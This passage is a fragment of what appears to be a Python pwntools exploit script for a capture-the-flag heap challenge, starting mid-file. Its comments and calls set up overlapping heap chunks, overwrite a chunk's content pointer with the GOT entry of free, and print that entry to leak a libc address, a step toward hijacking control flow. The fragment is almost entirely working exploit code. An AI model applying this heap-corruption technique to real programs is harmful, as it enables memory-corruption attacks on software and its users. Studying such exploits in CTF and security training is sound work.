...
# new heap 1's content will point to old heap 1's struct, size 0x40
# new heap 1's content includes new heap1's struct!!!
# that is to say we can overwrite new heap 1's struct
# here we overwrite its heap content pointer to free@got
create(0x30, p64(0) * 4 + p64(0x8) + p64(heap.got['free']))  #1
# leak freeaddr
show(1)
r.recvuntil("Content : ")
